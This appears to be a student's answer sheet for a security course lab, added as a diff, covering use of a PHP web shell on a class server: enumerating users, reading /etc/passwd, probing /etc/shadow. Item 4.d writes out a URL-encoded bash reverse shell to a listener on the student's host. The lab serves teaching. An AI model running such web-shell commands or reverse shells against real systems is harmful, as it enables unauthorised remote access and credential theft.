@@ -1,0 +1,31 @@
+1.a. http://danger.jeffondich.com/uploadedimages/ederingtons-webshell.php?command=whoami is the command, www-data is the output.
+
+1.b. the pre tag formats command output more nicely when you use the shell.
+
+2.a. http://danger.jeffondich.com/uploadedimages/ederingtons-webshell.php?command=realpath%20ederingtson-webshell.php is a command that gives me the file path for my webshell, which is located in /var/www/danger.jeffondich.com/uploadedimages/ederingtson-webshell.php, so I would danger.jeffondich.com is located in /var/www/.
+
+2.b. lslogins command gives the following users, including system ones: root, daemon, bin, sys, sync, games, man, lp, mail, news, uucp, proxy, www-data, backup, list, irc, gnats, systemd-network, systemd-resolve, messagebus, systemd-timesync, syslog, _apt, tss, uuidd, tcpdump, usbmux, sshd, pollinate, landscape, fwupd-refresh, postgres, jeff, Bullwinkle, nobody. jeff, Bullwinkle, and nobody are probably the only human user accounts.
+
+2.c. I have read access to the file. It contains a list of usernames, ids, last-logins, and some other stuff.
+
+2.d. I do not have access to the file. It contains the hashed password for users.
+
+2.e. I've found 2, frog and birds-land ascii text, then i used file secrets.txt / to find two more.
+
+2.f. I don't have to retype %20's, I can leave them as spaces after the first time I use them (until i delete the space, then I have to redo with another %20).
+
+4.a. ip a command gives the ip address of my kali machine as 192.168.163.128.
+
+4.b. ip a command gives the ip address of my host OS as 172.23.5.71.
+
+4.c. I chose the port 3957.
+
+4.d. http://192.168.163.128/webshell.php?command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/172.23.5.71/3957%200%3E%261%22 was what i put in my browser.
+
+4.e. Yep, its just got an annoying www-data in front of the address for some reason that stays after I run commands from the bash terminal.
+
+4.f. Hexadecimal Unicode codes for special characters, %20 is a space, %22 is ", %3E is >, %26 is &, and then I have no idea what those last few are.
+
+4.g. On my host OS I set up a port to have a conversation to wait for something to come in. Making a bit of extra fun, that was done on Windows' Subsystem for Linux. Then, on a virtual machine, I set up a webserver with an exploitable webshell php file in it. From a browser on my host OS I accessed the server on the VM and could execute commands across it. I told it to run bash, and then give a bash terminal over to the thing listening on my host OS at the port I set up.
+
+So I have on my host OS a Windows Subsystem for Linux terminal displaying a bash terminal for a Kali Virtual Machine on my computer that was told to give the bash terminal over by a php webshell in the apache2 server the VM was hosting by a browser on my host OS with a get request to the webshell in the server that includes a weird long command.
